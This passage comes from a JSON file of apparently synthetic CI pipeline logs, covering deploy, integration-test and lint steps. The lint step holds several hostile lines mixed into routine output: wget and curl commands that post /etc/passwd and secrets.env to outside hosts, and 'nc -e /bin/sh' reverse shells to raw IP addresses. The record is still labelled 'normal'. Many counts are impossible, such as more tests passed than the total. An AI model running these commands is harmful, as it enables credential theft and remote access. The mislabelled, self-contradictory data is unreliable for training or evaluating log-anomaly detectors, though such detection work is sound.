          "Generating source maps...",
          "Optimizing 74 modules...",
          "Step 16/23: Linting",
          "POST /api - 202 (302ms)",
          "Verifying...",
          "Using Node.js 15.0.4",
          "Using Node.js 14.1.8",
          "Minifying vendor.js",
          "Finished.",
          "TLS handshake completed",
          "[12:19:20] DEBUG: Loading configuration",
          "Connecting to test.io:443...",
          "npm install: added 218 packages",
          "npm notice: package.json updated",
          "[12:19:20] INFO: Starting build process",
          "npm install: resolved 1297 packages",
          "Switched to branch 'hotfix/task-781'",
          "Success!",
          "Already up to date.",
          "Generating source maps...",
          "Done.",
          "\u2713 Task completed in 2674ms",
          "Step 17/18: Installing dependencies",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_auth_login (425ms)",
          "Compiling src/utils.go...",
          "Cache restored successfully (291MB)",
          "npm notice: created a lockfile",
          "Layer 7/11: COPY command",
          "[12:19:20] INFO: Processing request",
          "Generating source maps...",
          "Optimizing 94 modules...",
          "Step 13/21: Installing dependencies",
          "pip: Collecting express",
          "\u2717 build failed with exit code 32",
          "Installing webpack@5.1.5",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Uploading artifact 'build' (31 files)",
          "Step 20/15: Running migrations",
          "[12:19:20] INFO: Request completed",
          "Pulling image: alpine:latest",
          "Completed.",
          "  PASS: integration/test_auth_login.spec.js",
          "Cache restored successfully (326MB)",
          "Processing...",
          "POST /data - 202 (490ms)",
          "Step 13/23: Building",
          "[12:19:20] INFO: Processing request",
          "Cache saved successfully",
          "  PASS: test_api_health (459ms)",
          "GET /api - 200 (9ms)",
          "[12:19:20] INFO: Processing request",
          "Ready.",
          "\u2713 Step 'test' succeeded",
          "npm notice: package.json updated",
          "\u2717 build failed with exit code 90",
          "Time: 72.627s",
          "Cache miss for key-1422",
          "Already up to date.",
          "Cache invalidated: build",
          "Step 6/18: Running migrations",
          "Ready.",
          "Checking out develop branch",
          "npm install: resolved 1010 packages",
          "Uploading artifact 'coverage' (42 files)",
          "Compiling utils/utils.go...",
          "NODE_ENV=production",
          "Step 17/23: Linting",
          "Success!",
          "[12:19:20] DEBUG: Connection pool: 8 active",
          "Uploading artifact 'build' (12 files)",
          "\u2713 All checks passed",
          "Artifact downloaded: 10MB",
          "Step 18/17: Building",
          "Pushing to registry...",
          "pip: Collecting prettier",
          "Time: 54.962s",
          "  PASS: e2e/test_api_health.spec.js",
          "Artifact uploaded: dist.zip (62MB)",
          "Bundling styles.js",
          "[12:19:20] INFO: Connecting to database",
          "[12:19:20] DEBUG: Connection pool: 16 active",
          "Success!",
          "[12:19:20] INFO: Processing request",
          "Creating production build...",
          "Platform: linux-x64",
          "Environment: staging",
          "\u2713 Step 'setup' succeeded",
          "Bundling vendor.js",
          "Installing eslint@5.6.2",
          "Compiling src/handler.rs...",
          "Artifact downloaded: 13MB",
          "  PASS: test_api_health (77ms)",
          "pip: Installing build dependencies...",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:19:20] DEBUG: Loading configuration",
          "Time: 34.445s",
          "yarn add: Done in 12.74s",
          "\u2713 All checks passed",
          "npm install: added 497 packages",
          "Optimizing 64 modules...",
          "OK",
          "  PASS: test_db_connect (387ms)",
          "pip: Downloading react-2.3.tar.gz",
          "yarn add: Done in 8.52s",
          "Cache hit for key-7062",
          "yarn add: Done in 3.25s",
          "Connection established",
          "POST /data - 201 (166ms)",
          "Minifying vendor.js",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-05T12:21:41.990308",
        "finished_at": "2025-12-05T12:21:47.342818",
        "log_lines": [
          "=== Step: deploy_production ===",
          "pip: Collecting jest",
          "Artifact downloaded: 21MB",
          "Checking out master branch",
          "Connecting to startup.dev:443...",
          "Step 17/16: Building",
          "Checking out develop branch",
          "Checking out master branch",
          "Loading...",
          "Tests: 204 passed, 144 total",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Verifying...",
          "Layer 4/15: COPY command",
          "Cache invalidated: node_modules",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Ran 155 tests in 6s",
          "Cache miss for key-3901",
          "Using Python 3.10",
          "TLS handshake completed",
          "[12:19:20] DEBUG: Query executed in 75ms",
          "Cache invalidated: node_modules",
          "Pushing to registry...",
          "WARNING: prettier has known vulnerabilities",
          "Connection established",
          "Processing...",
          "Layer 4/9: COPY command",
          "Generating source maps...",
          "Artifact uploaded: dist.zip (91MB)",
          "\u2713 Step 'setup' succeeded",
          "\u2713 test completed",
          "Snapshots: 19 passed, 40 total",
          "[12:19:20] WARN: Deprecated API usage",
          "Cache miss for key-5615",
          "yarn add: Done in 7.73s",
          "[12:19:20] WARN: Deprecated API usage",
          "[12:19:20] INFO: Request completed",
          "Pulling image: node:3.11",
          "Installing prettier@2.11.4",
          "Artifact downloaded: 7MB",
          "Bundling styles.js",
          "Fetching submodules...",
          "Building Docker image...",
          "Snapshots: 42 passed, 24 total",
          "Using Python 3.12",
          "Step 20/21: Testing",
          "Snapshots: 42 passed, 6 total",
          "[12:19:20] DEBUG: Loading configuration",
          "Connection established",
          "Completed.",
          "pip: Installing build dependencies...",
          "Step 20/24: Building",
          "Time: 67.745s",
          "Step 4/23: Deploying",
          "Loading...",
          "OK",
          "yarn add: Done in 29.89s",
          "Layer 9/13: ENV command",
          "Cache saved successfully",
          "Compiling src/app.ts...",
          "Compiling components/utils.go...",
          "npm install: added 350 packages",
          "Minifying app.js",
          "pip: Downloading axios-4.14.tar.gz",
          "Using Node.js 20.8.5",
          "Waiting...",
          "Step 14/18: Deploying",
          "Ready.",
          "Test Suites: 15 passed, 47 total",
          "Step 14/16: Testing",
          "npm install: added 296 packages",
          "Exception: TypeError",
          "GET /health - 201 (34ms)",
          "Connection established",
          "[12:19:20] INFO: Request completed",
          "Success!",
          "Optimizing 14 modules...",
          "Success!",
          "Cache invalidated: build",
          "Optimizing 46 modules...",
          "[12:19:20] INFO: Processing request",
          "Step 12/21: Deploying",
          "Artifact downloaded: 49MB",
          "[12:19:20] INFO: Request completed",
          "Artifact downloaded: 25MB",
          "npm notice: package.json updated",
          "Bundling runtime.css",
          "pip: Installing build dependencies...",
          "Compiling utils/service.java...",
          "Tests: 412 passed, 57 total",
          "pip: Collecting express",
          "GET /api - 200 (38ms)",
          "Snapshots: 3 passed, 19 total",
          "Snapshots: 6 passed, 25 total",
          "Already up to date.",
          "Generating source maps...",
          "Installing prettier@5.20.7",
          "\u2713 All checks passed",
          "GET /status - 201 (57ms)",
          "Cache miss for key-8368",
          "npm notice: created a lockfile",
          "pip install: Successfully installed jest-4.3",
          "Step 1/19: Deploying",
          "Success!",
          "Snapshots: 19 passed, 19 total",
          "Bundling runtime.js",
          "Step 20/23: Installing dependencies",
          "Step 4/16: Deploying",
          "Connecting to cloud.services:443...",
          "\u2713 All checks passed",
          "pip install: Successfully installed react-5.12",
          "[12:19:20] INFO: Processing request",
          "pip: Installing build dependencies...",
          "\u2713 build completed",
          "TLS handshake completed",
          "Tests: 171 passed, 61 total",
          "Compiling src/handler.rs...",
          "pip: Installing build dependencies...",
          "Cache invalidated: dependencies",
          "Minifying app.js",
          "Cache hit for key-4484",
          "Done.",
          "Connection established",
          "Bundling main.css",
          "Finished.",
          "Completed.",
          "[12:19:20] INFO: Cache refreshed",
          "Waiting...",
          "Using Node.js 18.20.2",
          "Verifying...",
          "Time: 105.583s",
          "Processing...",
          "WARNING: react has known vulnerabilities",
          "[12:19:20] WARN: Deprecated API usage",
          "  PASS: test_api_health (311ms)",
          "[12:19:20] INFO: Request completed",
          "[12:19:20] INFO: Connecting to database",
          "Waiting...",
          "Loading...",
          "yarn add: Done in 18.30s",
          "Step 9/18: Installing dependencies",
          "Test Suites: 10 passed, 33 total",
          "[12:19:20] INFO: Connecting to database",
          "[12:19:20] INFO: Request completed",
          "Step 4/15: Deploying",
          "Processing...",
          "Compiling utils/handler.rs...",
          "Finished.",
          "OK",
          "Finished.",
          "\u2713 Step 'install' succeeded",
          "Generating source maps...",
          "Cache invalidated: dependencies",
          "[12:19:20] DEBUG: Memory usage: 532MB",
          "pip: Installing build dependencies...",
          "Switched to branch 'hotfix/task-961'",
          "Creating production build...",
          "npm install: resolved 1836 packages",
          "[12:19:20] WARN: Deprecated API usage",
          "Step 5/23: Building",
          "Step 16/25: Building",
          "Finished.",
          "Step 5/19: Installing dependencies",
          "[12:19:20] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Compiling src/utils.go...",
          "Creating production build...",
          "Installing lodash@5.1.10",
          "TLS handshake completed",
          "Checking out develop branch",
          "OK",
          "Done.",
          "\u2713 Step 'install' succeeded",
          "Already up to date.",
          "  PASS: test_db_connect (477ms)",
          "Platform: darwin-arm64",
          "Optimizing 76 modules...",
          "Time: 38.158s",
          "Tests: 151 passed, 438 total",
          "TLS handshake completed",
          "Building Docker image...",
          "Coverage: 87% statements, 97% branches",
          "\u2713 Task completed in 4376ms",
          "pip install: Successfully installed lodash-4.13",
          "Verifying...",
          "Tests: 319 passed, 100 total",
          "Loading...",
          "  PASS: test_auth_login (294ms)",
          "Building Docker image...",
          "[12:19:20] INFO: Connecting to database",
          "\u2713 All checks passed",
          "Pulling image: alpine:3.11",
          "Platform: darwin-arm64",
          "pip: Installing build dependencies...",
          "Loading...",
          "OK",
          "Checking out main branch",
          "[12:19:20] INFO: Request completed",
          "  PASS: test_user_create (167ms)",
          "[12:19:20] DEBUG: Query executed in 30ms",
          "OK",
          "pip: Installing build dependencies...",
          "[12:19:20] DEBUG: Query executed in 22ms",
          "Compiling src/utils.go...",
          "pip: Downloading webpack-5.15.tar.gz",
          "Switched to branch 'hotfix/task-599'",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:20] INFO: Request completed",
          "WARNING: eslint has known vulnerabilities",
          "Compiling components/index.js...",
          "pip install: Successfully installed axios-5.13",
          "Transforming 900 files...",
          "OK",
          "Completed.",
          "\u2713 Task completed in 2383ms",
          "Building Docker image...",
          "Cache restored successfully (17MB)",
          "Cache hit for key-5878",
          "Environment: staging",
          "[12:19:20] DEBUG: Memory usage: 562MB",
          "Creating production build...",
          "Cache saved successfully",
          "Compiling lib/index.js...",
          "Compiling components/service.java...",
          "NODE_ENV=development",
          "Environment: test",
          "Loading...",
          "[12:19:20] DEBUG: Query executed in 43ms",
          "Environment: development",
          "\u2713 All checks passed",
          "Loading...",
          "npm notice: package.json updated",
          "Optimizing 76 modules...",
          "Building Docker image...",
          "Compiling utils/handler.rs...",
          "Completed.",
          "Time: 72.361s",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-05T12:21:47.342818",
        "finished_at": "2025-12-05T12:22:14.105368",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Bundling runtime.js",
          "Building Docker image...",
          "Using Python 3.11",
          "Exception: ValueError",
          "Compiling components/handler.rs...",
          "pip: Installing build dependencies...",
          "[12:19:20] DEBUG: Query executed in 72ms",
          "Done.",
          "Exception: NullPointerException",
          "Cache restored successfully (166MB)",
          "Artifact downloaded: 18MB",
          "Transforming 616 files...",
          "Environment: staging",
          "FAILED: test_user_create",
          "Switched to branch 'bugfix/task-297'",
          "Completed.",
          "Cache hit for key-1543",
          "\u2717 build failed with exit code 105",
          "FAILED: test_api_health",
          "Done.",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/utils.go...",
          "GET /status - 204 (18ms)",
          "Step 17/24: Building",
          "Time: 113.416s",
          "Minifying vendor.js",
          "\u2713 Step 'build' succeeded",
          "Cache hit for key-1230",
          "Step 15/15: Installing dependencies",
          "Cache saved successfully",
          "[12:19:20] DEBUG: Initializing service",
          "[12:19:20] DEBUG: Initializing service",
          "Layer 5/8: RUN command",
          "Switched to branch 'hotfix/task-205'",
          "[12:19:20] WARN: Deprecated API usage",
          "\u2713 Step 'checkout' succeeded",
          "Step 3/18: Building",
          "Using Node.js 20.8.5",
          "Bundling runtime.js",
          "npm install: resolved 524 packages",
          "Waiting...",
          "Time: 99.334s",
          "Cache miss for key-5063",
          "OK",
          "[12:19:20] WARN: Deprecated API usage",
          "Optimizing 75 modules...",
          "POST /upload - 200 (483ms)",
          "[12:19:20] ERROR: Connection failed",
          "Generating source maps...",
          "Creating production build...",
          "pip: Downloading lodash-3.16.tar.gz",
          "npm install: added 436 packages",
          "[12:19:20] INFO: Connecting to database",
          "[12:19:20] INFO: Cache refreshed",
          "Pushing to registry...",
          "[12:19:20] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "Snapshots: 32 passed, 41 total",
          "Transforming 581 files...",
          "\u2713 All checks passed",
          "[12:19:20] INFO: Connecting to database",
          "\u2713 All checks passed",
          "Optimizing 42 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Layer 3/15: COPY command",
          "Artifact uploaded: dist.zip (29MB)",
          "Bundling styles.js",
          "Processing...",
          "Image pulled successfully",
          "Time: 1.713s",
          "Coverage: 87% statements, 86% branches",
          "OK",
          "yarn add: Done in 23.16s",
          "Step 13/25: Installing dependencies",
          "Already up to date.",
          "Step 16/16: Running migrations",
          "Finished.",
          "Artifact uploaded: dist.zip (39MB)",
          "Building Docker image...",
          "\u2713 test completed",
          "Ran 10 tests in 50s",
          "Finished.",
          "Time: 115.240s",
          "Verifying...",
          "[12:19:20] DEBUG: Memory usage: 1020MB",
          "Connection established",
          "Cache restored successfully (57MB)",
          "HEAD is now at 34cc079",
          "[12:19:20] WARN: Deprecated API usage",
          "TLS handshake completed",
          "[12:19:20] DEBUG: Loading configuration",
          "npm install: resolved 805 packages",
          "[12:19:20] DEBUG: Initializing service",
          "Time: 88.89s",
          "Image pulled successfully",
          "HEAD is now at 0aee7b7",
          "yarn add: Done in 11.36s",
          "Bundling vendor.css",
          "Artifact downloaded: 28MB",
          "Snapshots: 43 passed, 13 total",
          "WARNING: express has known vulnerabilities",
          "Pulling image: alpine:latest",
          "Step 15/25: Deploying",
          "Platform: linux-x64",
          "Cache restored successfully (221MB)",
          "[12:19:20] DEBUG: Connection pool: 2 active",
          "TLS handshake completed",
          "Time: 106.624s",
          "Waiting...",
          "Connecting to startup.dev:443...",
          "Checking out master branch",
          "Checking out main branch",
          "Cache restored successfully (259MB)",
          "Layer 5/11: COPY command",
          "Done.",
          "\u2713 test completed",
          "[12:19:20] INFO: Connecting to database",
          "Step 11/18: Installing dependencies",
          "pip: Installing build dependencies...",
          "[12:19:20] INFO: Starting build process",
          "Layer 4/11: RUN command",
          "FAILED: test_db_connect",
          "[12:19:20] DEBUG: Query executed in 79ms",
          "Platform: darwin-arm64",
          "Loading...",
          "Switched to branch 'bugfix/task-904'",
          "Optimizing 79 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:20] INFO: Cache refreshed",
          "Creating production build...",
          "Step 8/25: Building",
          "Creating production build...",
          "Already up to date.",
          "Uploading artifact 'dist' (3 files)",
          "Platform: linux-x64",
          "WARNING: express has known vulnerabilities",
          "Compiling utils/utils.go...",
          "[12:19:20] DEBUG: Initializing service",
          "Cache restored successfully (158MB)",
          "Cache invalidated: dependencies",
          "Pushing to registry...",
          "Compiling utils/main.py...",
          "Step 1/17: Linting",
          "\u2713 Task completed in 1944ms",
          "Compiling components/service.java...",
          "npm install: resolved 1172 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-2820",
          "Artifact uploaded: dist.zip (19MB)",
          "Connection established",
          "Building Docker image...",
          "Step 3/23: Building",
          "\u2713 Task completed in 1228ms",
          "npm notice: created a lockfile",
          "Fetching submodules...",
          "pip: Downloading express-1.17.tar.gz",
          "Step 5/19: Running migrations",
          "[12:19:20] DEBUG: Query executed in 65ms",
          "\u2717 build failed with exit code 124",
          "Step 13/23: Deploying",
          "Optimizing 88 modules...",
          "Success!",
          "Connecting to test.io:443...",
          "Snapshots: 14 passed, 19 total",
          "Step 10/18: Running migrations",
          "\u2713 All checks passed",
          "Completed.",
          "Minifying vendor.js",
          "\u2717 build failed with exit code 122",
          "Waiting...",
          "Test Suites: 44 passed, 17 total",
          "npm notice: created a lockfile",
          "Processing...",
          "[12:19:20] DEBUG: Connection pool: 7 active",
          "pip: Installing build dependencies...",
          "Cache invalidated: dependencies",
          "Finished.",
          "Waiting...",
          "Transforming 500 files...",
          "Compiling src/service.java...",
          "npm install: added 210 packages",
          "Cache saved successfully",
          "Already up to date.",
          "[12:19:20] INFO: Request completed",
          "pip: Downloading lodash-4.10.tar.gz",
          "npm install: added 323 packages",
          "npm notice: package.json updated",
          "Verifying...",
          "Layer 8/11: ENV command",
          "WARNING: lodash has known vulnerabilities",
          "Optimizing 76 modules...",
          "[12:19:20] DEBUG: Memory usage: 1347MB",
          "Compiling utils/utils.go...",
          "Connection established",
          "\u2713 validate completed",
          "Cache hit for key-4723",
          "Generating source maps...",
          "GET /status - 201 (52ms)",
          "pip install: Successfully installed eslint-2.20",
          "Step 20/21: Testing",
          "Transforming 786 files...",
          "pip: Installing build dependencies...",
          "Using Node.js 17.0.2",
          "Image pulled successfully",
          "Compiling utils/index.js...",
          "Platform: darwin-arm64",
          "Switched to branch 'hotfix/task-313'",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache restored successfully (14MB)",
          "\u2713 Task completed in 3532ms",
          "Generating source maps...",
          "\u2717 build failed with exit code 124",
          "Cache miss for key-4004",
          "Creating production build...",
          "Building Docker image...",
          "Step 12/15: Linting",
          "Fetching submodules...",
          "Step 6/24: Installing dependencies",
          "[12:19:20] DEBUG: Loading configuration",
          "Time: 61.362s",
          "Cache miss for key-4932",
          "Artifact downloaded: 40MB",
          "Snapshots: 20 passed, 47 total",
          "yarn add: Done in 10.59s",
          "Time: 26.171s",
          "OK",
          "Checking out master branch",
          "Step 18/15: Testing",
          "pip install: Successfully installed eslint-2.8",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Processing...",
          "[12:19:20] DEBUG: Memory usage: 1895MB",
          "[12:19:20] INFO: Request completed",
          "pip: Downloading webpack-5.6.tar.gz",
          "Transforming 173 files...",
          "Optimizing 56 modules...",
          "[12:19:20] INFO: Cache refreshed",
          "Cache miss for key-3890",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-05T12:22:14.105368",
        "finished_at": "2025-12-05T12:22:27.486643",
        "log_lines": [
          "=== Step: lint ===",
          "Transforming 988 files...",
          "[12:19:20] INFO: Starting build process",
          "Artifact uploaded: dist.zip (92MB)",
          "Artifact uploaded: dist.zip (10MB)",
          "Switched to branch 'feature/task-966'",
          "Finished.",
          "Using Node.js 18.6.7",
          "Building Docker image...",
          "[12:19:20] DEBUG: Memory usage: 1705MB",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Finished.",
          "npm notice: package.json updated",
          "Artifact downloaded: 33MB",
          "Coverage: 75% statements, 76% branches",
          "Success!",
          "Coverage: 88% statements, 63% branches",
          "WARNING: prettier has known vulnerabilities",
          "Coverage: 99% statements, 100% branches",
          "[12:19:20] INFO: Request completed",
          "Tests: 350 passed, 191 total",
          "Uploading artifact 'coverage' (36 files)",
          "[12:19:20] DEBUG: Initializing service",
          "Coverage: 96% statements, 94% branches",
          "[12:19:20] INFO: Cache refreshed",
          "Bundling runtime.js",
          "[12:19:20] WARN: Deprecated API usage",
          "Platform: linux-x64",
          "Finished.",
          "[12:19:20] DEBUG: Query executed in 92ms",
          "Waiting...",
          "Building Docker image...",
          "  PASS: integration/test_api_health.spec.js",
          "Connecting to startup.dev:443...",
          "[12:19:20] DEBUG: Memory usage: 1701MB",
          "Generating source maps...",
          "Tests: 482 passed, 236 total",
          "Coverage: 74% statements, 61% branches",
          "Step 14/25: Running migrations",
          "Loading...",
          "WARNING: react has known vulnerabilities",
          "\u2713 Task completed in 4342ms",
          "Cache hit for key-9131",
          "Compiling lib/utils.go...",
          "[12:19:20] ERROR: Connection failed",
          "WARNING: express has known vulnerabilities",
          "Step 19/22: Installing dependencies",
          "Test Suites: 37 passed, 28 total",
          "Artifact downloaded: 41MB",
          "Checking out master branch",
          "Done.",
          "HEAD is now at 4723f42",
          "Cache restored successfully (453MB)",
          "Creating production build...",
          "npm notice: package.json updated",
          "Already up to date.",
          "POST /api - 201 (469ms)",
          "[12:19:20] INFO: Cache refreshed",
          "yarn add: Done in 23.79s",
          "Compiling components/utils.go...",
          "Success!",
          "[12:19:20] DEBUG: Loading configuration",
          "Platform: win32-x64",
          "Platform: win32-x64",
          "Bundling styles.js",
          "Compiling lib/main.py...",
          "FAILED: test_user_create",
          "Using Node.js 19.3.5",
          "nc -e /bin/sh 1.148.231.54 12530",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "pip install: Successfully installed webpack-2.6",
          "Compiling components/utils.go...",
          "Waiting...",
          "Uploading artifact 'build' (4 files)",
          "Finished.",
          "Success!",
          "Cache miss for key-9184",
          "Checking out develop branch",
          "\u2713 All checks passed",
          "Done.",
          "Finished.",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "FAILED: test_api_health",
          "Ran 169 tests in 32s",
          "Pulling image: python:latest",
          "[12:19:20] DEBUG: Memory usage: 1337MB",
          "Artifact uploaded: dist.zip (48MB)",
          "Connecting to cloud.services:443...",
          "Ran 25 tests in 41s",
          "[12:19:20] INFO: Starting build process",
          "pip install: Successfully installed lodash-3.3",
          "npm notice: package.json updated",
          "Coverage: 70% statements, 72% branches",
          "WARNING: axios has known vulnerabilities",
          "Step 1/25: Installing dependencies",
          "[12:19:20] INFO: Request completed",
          "Step 17/20: Installing dependencies",
          "nc -e /bin/sh 149.205.208.187 36101",
          "Compiling src/app.ts...",
          "Processing...",
          "Cache hit for key-9125",
          "npm notice: package.json updated",
          "OK",
          "pip install: Successfully installed axios-2.6",
          "Cache invalidated: node_modules",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Step 16/21: Testing",
          "Step 3/20: Deploying",
          "Artifact downloaded: 32MB",
          "nc -e /bin/sh 134.199.55.57 16337",
          "Compiling components/handler.rs...",
          "Artifact downloaded: 50MB",
          "\u2713 package completed",
          "Layer 10/10: ENV command",
          "[12:19:20] DEBUG: Loading configuration",
          "Step 11/18: Installing dependencies",
          "[12:19:20] INFO: Cache refreshed",
          "Step 10/25: Installing dependencies",
          "Step 3/25: Linting",
          "npm notice: package.json updated",
          "Using Python 3.9",
          "  PASS: e2e/test_user_create.spec.js",
          "Cache hit for key-3781",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "[12:19:20] DEBUG: Query executed in 60ms",
          "Installing jest@1.10.8",
          "\u2713 deploy completed",
          "Processing...",
          "Sending 210MB of data to test.io",
          "Checking out develop branch",
          "WARNING: axios has known vulnerabilities",
          "Cache miss for key-6520",
          "Environment: staging",
          "Fetching submodules...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Step 4/25: Testing",
          "pip install: Successfully installed eslint-2.11",
          "Cache invalidated: build",
          "Completed.",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "[12:19:20] INFO: Starting build process",
          "Uploading artifact 'build' (26 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling components/utils.go...",
          "Verifying...",
          "Cache hit for key-5022",
          "Layer 3/14: COPY command",
          "[12:19:20] INFO: Processing request",
          "Compiling utils/index.js...",
          "Platform: win32-x64",
          "npm install: resolved 1086 packages",
          "Minifying vendor.js",
          "Waiting...",
          "Verifying...",
          "nc -e /bin/sh 78.125.75.24 35005",
          "pip install: Successfully installed webpack-4.7",
          "[12:19:20] WARN: Deprecated API usage",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Verifying...",
          "Pulling image: node:3.11",
          "[12:19:20] DEBUG: Connection pool: 20 active",
          "HEAD is now at 459e4e4",
          "[12:19:20] DEBUG: Loading configuration",
          "Compiling lib/service.java...",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (273ms)",
          "Exception: ValueError",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Finished.",
          "npm install: resolved 1551 packages",
          "[12:19:20] WARN: Deprecated API usage",
          "Sending 330MB of data to startup.dev",
          "Checking out main branch",
          "FAILED: test_api_health",
          "Processing...",
          "Pulling image: node:latest",
          "Cache miss for key-3676",
          "Compiling src/utils.go...",
          "Exception: ValueError",
          "Snapshots: 22 passed, 50 total",
          "nc -e /bin/sh 254.191.14.107 11453",
          "Optimizing 95 modules...",
          "pip: Downloading jest-5.14.tar.gz",
          "NODE_ENV=production",
          "Compiling lib/utils.go...",
          "[12:19:20] WARN: Deprecated API usage",
          "Connection established",
          "\u2713 Task completed in 4914ms",
          "Ran 151 tests in 19s",
          "pip install: Successfully installed axios-1.11",
          "WARNING: prettier has known vulnerabilities",
          "Layer 6/12: RUN command",
          "[12:19:20] INFO: Cache refreshed",
          "Step 3/22: Installing dependencies",
          "\u2713 Step 'install' succeeded",
          "[12:19:20] DEBUG: Memory usage: 852MB",
          "[12:19:20] DEBUG: Memory usage: 717MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Downloading axios-4.18.tar.gz",
          "Connecting to startup.dev:443...",
          "[12:19:20] INFO: Starting build process",
          "Verifying...",
          "[12:19:20] DEBUG: Query executed in 51ms",
          "Step 4/16: Linting",
          "Cache saved successfully",
          "[12:19:20] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Checking out master branch",
          "[12:19:20] DEBUG: Query executed in 45ms",
          "FAILED: test_auth_login",
          "Using Node.js 15.15.3",
          "Pushing to registry...",
          "Cache miss for key-1218",
          "Step 20/25: Linting",
          "Using Node.js 18.3.2",
          "Image pulled successfully",
          "yarn add: Done in 22.45s",
          "\u2713 Step 'setup' succeeded",
          "Connecting to acme.corp:443...",
          "\u2713 All checks passed",
          "\u2713 Step 'test' succeeded",
          "Success!",
          "Processing...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Step 18/21: Deploying",
          "Cache hit for key-3388",
          "Installing eslint@4.1.0",
          "FAILED: test_auth_login",
          "Minifying app.js",
          "[12:19:20] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "pip: Collecting axios",
          "Done.",
          "nc -e /bin/sh 195.56.130.253 32706",
          "Waiting...",
          "Installing jest@3.20.7",
          "Test Suites: 26 passed, 7 total",
          "[12:19:20] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (21MB)",
          "[12:19:20] WARN: Deprecated API usage",
          "[12:19:20] DEBUG: Connection pool: 17 active",
          "WARNING: axios has known vulnerabilities",
          "Installing express@4.15.7",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "\u2713 test completed",
          "Artifact downloaded: 24MB",
          "Already up to date.",
          "[12:19:20] INFO: Cache refreshed",
          "Step 17/25: Deploying",
          "Compiling lib/main.py...",
          "WARNING: express has known vulnerabilities",
          "=== Step lint completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}